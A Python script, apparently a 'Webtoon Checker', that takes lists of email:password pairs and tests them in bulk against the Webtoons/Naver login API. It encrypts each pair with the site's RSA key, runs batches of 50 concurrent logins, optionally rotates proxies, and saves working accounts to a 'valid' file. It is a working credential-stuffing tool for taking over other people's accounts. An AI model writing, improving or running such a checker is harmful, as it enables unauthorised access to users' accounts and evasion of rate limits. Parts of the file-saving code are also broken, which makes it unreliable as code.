import os
from rsa import PublicKey, encrypt as rsae
from binascii import hexlify
from logmagix import Logger, Home
import asyncio
import aiohttp
import random

class AccountChecker:
    def __init__(self, proxyless=True, proxy_file="proxies.txt"):
        self.logger = Logger()
        self.proxyless = proxyless
        self.proxies = []
        self.home = Home("Webtoon Checker", align="center", credits="discord.cyberious.xyz")
        self.home.display()
        
        if not proxyless:
            with open(proxy_file, 'r') as f:
                self.proxies = [line.strip() for line in f if line.strip()]
       
        os.makedirs('output', exist_ok=True)
        self.output_files = {
            'valid': 'output/valid.txt',
            'invalid': 'output/invalid.txt',
            'verify': 'output/email verification.txt'
        }
    
    def get_proxy(self):
        if self.proxyless or not self.proxies:
            return None
        return f"http://{random.choice(self.proxies)}"
    
    def chrlen(self, n: str) -> str:
        return chr(len(n))

    def encrypt(self, json, mail, pw):
        string = f"{self.chrlen(json['sessionKey'])}{json['sessionKey']}{self.chrlen(mail)}{mail}{self.chrlen(pw)}{pw}".encode()
        mod = int(json['nvalue'], 16)
        evl = int(json['evalue'], 16)
        pbk = PublicKey(evl, mod)
        out = rsae(string, pbk)
        return hexlify(out).decode('utf-8')

    async def get_key(self, session):
        try:
            proxy = self.get_proxy()
            async with session.get("https://www.webtoons.com/member/login/rsa/getKeys", proxy=proxy) as response:
                response.raise_for_status()
                return await response.json()
        except (aiohttp.ClientError, ValueError) as e:
            self.logger.failure(f"Error getting RSA keys: {str(e)}")
            return None

    async def check_account(self, session, email, password):
        try:
            json = await self.get_key(session)
            if not json:
                return None
                
            url = "https://global.apis.naver.com/lineWebtoon/webtoon/loginById.json"
            payload = {
                "serviceZone": "GLOBAL",
                "encpw": self.encrypt(json, email, password),
                "loginType": "EMAIL",
                "v": "3",
                "language": "en",
                "encnm": json["keyName"]
            }
            
            proxy = self.get_proxy()
            async with session.post(url, data=payload, proxy=proxy) as response:
                response.raise_for_status()
                return await response.json()
        except (aiohttp.ClientError, ValueError) as e:
            self.logger.failure(f"Error checking account: {str(e)}")
            return None

    async def process_account(self, session, account, queue):
        if not account.strip():
            return
            
        email, password = account.strip().split(':')
        response = await self.check_account(session, email, password)
        
        if not response:
            return
            
        try:
            display_email = email[:12] + "..." if len(email) > 15 else email
            
            login_status = response['message']['result']['login_status']
            result = None
            
            if login_status == 0:
                result = ('success', f"{email}:{password}", f"{display_email} | Valid Account")
            elif login_status == 110:
                result = ('failure', f"{email}:{password}", f"{display_email} | Invalid Account")
            elif login_status == 210:
                result = ('failure', f"{email}:{password}", f"{display_email} | Invalid Password")
            elif login_status == 90000:
                result = ('warning', f"{email}:{password}", f"{display_email} | Requires Email Verification")
            else:
                result = ('info', None, f"{display_email} | Unknown Status: {login_status}")
            
            await queue.put(result)
                
        except KeyError:
            await queue.put(('failure', None, f"Error processing response for {display_email}"))

    async def save_to_file(self, filename, content):
       async with open(filename, 'a', encoding='utf-8') as f:
            await f.write(f"{content}\n")

    async def log_results(self, queue):
        while True:
            try:
                level, account_data, message = await queue.get()
                getattr(self.logger, level)(message)
                
                if account_data:
                    if level == 'success':
                        self.save_to_file(self.output_files['valid'], account_data)
                    elif level == 'failure':
                        self.save_to_file(self.output_files['invalid'], account_data)
                    elif level == 'warning':
                        self.save_to_file(self.output_files['verify'], account_data)
                
                queue.task_done()
            except asyncio.CancelledError:
                break

    async def start(self):
        for file_path in self.output_files.values():
            open(file_path, 'w').close()
            
        with open('accounts.txt', 'r') as file:
            accounts = [line for line in file.readlines() if line.strip()]
        
        total_accounts = len(accounts)
        self.logger.info(f"Starting to check {total_accounts} accounts")
        if not self.proxyless:
            self.logger.info(f"Using {len(self.proxies)} proxies")
        
        queue = asyncio.Queue()
        
        connector = aiohttp.TCPConnector(limit=50)
        async with aiohttp.ClientSession(connector=connector) as session:
            logger_task = asyncio.create_task(self.log_results(queue))
            
            try:
                chunk_size = 50
                for i in range(0, len(accounts), chunk_size):
                    chunk = accounts[i:i + chunk_size]
                    tasks = [
                        self.process_account(session, account, queue)
                        for account in chunk
                    ]
                    await asyncio.gather(*tasks, return_exceptions=True)
                
                await queue.join()
                
            finally:
                logger_task.cancel()
                try:
                    await logger_task
                except asyncio.CancelledError:
                    pass
                
            self.logger.critical(f"Finished checking {total_accounts} accounts")

def main():
    checker = AccountChecker(proxyless=True)
    asyncio.run(checker.start())

if __name__ == "__main__":
    main()